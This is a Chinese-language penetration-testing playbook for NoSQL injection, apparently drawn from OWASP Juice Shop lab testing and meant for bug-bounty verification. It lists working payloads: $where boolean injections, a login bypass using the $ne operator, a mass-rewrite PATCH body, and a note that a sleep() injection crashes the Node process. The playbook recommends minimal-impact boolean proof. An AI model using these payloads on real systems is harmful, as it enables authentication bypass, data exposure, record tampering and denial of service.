---
name: nosql-injection
category: nosql
source: 渗透/juice-shop-closeout/patterns/nosql-injection.md
verified_in: [juice-shop-nosql-where, juice-shop-nosql-search]
src_value: high
severity_ceiling: high
requires_auth: false
payload_count: 2
---

# NoSQL 注入验证剧本

> 来源：OWASP Juice Shop 实战（MarsDB）。核心原理：NoSQL 数据库未对查询参数做类型检查，直接传入对象/表达式。
> **实测记录（2026-08-23, Juice Shop 20.1.1）**：`/rest/track-order/' || true || '` 返回所有用户订单（含脱敏邮箱、产品明细），解锁 `NoSQL Exfiltration` 挑战。✅ 搜索 API `?q='||true||'` 返回全部产品。✅

## 0. 靶场实测要点（先读）

- **数据结构版本差异**：新版 review/order 主键为 `_id`（旧版为 `id`）——payload 引用字段前先 `curl` 看真实结构
- **`|| true ||` 系列是布尔证明**：正常查询返回 1 条、`'||false||'` 返回空、`'||true||'` 返回全部——三态对比即 confirmed 证据，无需提取数据
- **$where 拼接格式随版本变**（2026-08-23 实测）：`/rest/track-order/:id` 是 `this.orderId === '<id>'` 拼接——payload `1'||'1'=='1` 命中全部订单；`'||true||'` 在本版不生效（引号闭合不同），**先看源码再定 payload**
- **更新类接口找 PATCH 别找 PUT**（实测）：`PUT /rest/products/:id/reviews` 是创建、`PATCH /rest/products/reviews` 才是更新——`{"id":{"$ne":-1},"message":"..."}` 批量改写（modified>1 即证据）
- **NoSQL sleep 注入会崩 Node 进程**（实测教训）：marsdb `$where` 内 `sleep()` 对每条文档执行且异常未捕获 → 进程直接退出、**全部挑战进度丢失（内存态）**——DoS 验证优先用短超时/低文档数，或放最后打
- **触发面排序**：搜索/筛选接口（q、filter、where 参数）优先测，登录接口的 NoSQL 操作符注入（`{"$ne": null}`）其次

## 1. 识别

- 找 REST API 中带查询参数/JSON body 的接口：
  - 搜索类：`/search?q=xxx`、`/products?name=xxx`
  - 订单/追踪类：`/track-order/xxx`、`/orders/{id}`
  - 筛选类：`?filter=xxx`、`?where=xxx`
- 特征：Node.js 后端（Express/MongoDB/MarsDB）更常见
- 识别线索：参数名含 `where`、`query`、`search`、`filter`、`q`

## 2. Payload 序列

```text
# 1. $where 注入（字符串拼接型）
# 目标：把查询拼进 $where 表达式
GET /rest/track-order/' || true || '
# 返回所有订单 → 注入成功

# 2. $where 参数直接注入
GET /rest/orders/1?$where=true||1==1

# 3. 搜索 API 注入
GET /rest/products/search?q='||true||'

# 4. 操作符注入（JSON body 型）
POST /api/login
{"username": {"$ne": null}, "password": {"$ne": null}}
# MongoDB 操作符：$ne / $gt / $in / $regex / $where
```

### 判定用最小破坏

- `|| true ||` 系列只证明"表达式被拼接执行"，不提取数据
- 布尔差异对比：正常查询 vs `'||false||'`（应返回空）vs `'||true||'`（应返回全部）

## 3. 判定标准

confirmed 需同时满足：
- [ ] 注入表达式改变查询结果（true → 全部记录 / false → 空记录）
- [ ] 与正常请求形成可复现的布尔差异
- [ ] （数据提取类）能通过 `$regex` 或错误信息枚举出字段

## 4. 证据要求

按 `evidence-record.md`：
- 正常请求与注入请求的完整对照（响应记录数差异）
- 注入 payload 原文
- 若涉及数据提取：只提取字段名/结构证明，不批量导出用户数据

## 5. SRC 适用边界

- 适用：Node.js + NoSQL（MongoDB/MarsDB/Firestore）后端，尤其搜索与筛选接口
- 不适用：纯 SQL 后端（走 sql-injection 模板）、ORM 参数化查询的框架
- 注意：`$where` 注入可升级为 JS 代码执行（靶场原理：`Function("obj", "return " + expression)`），但 SRC 测试只做布尔证明，不执行任意代码
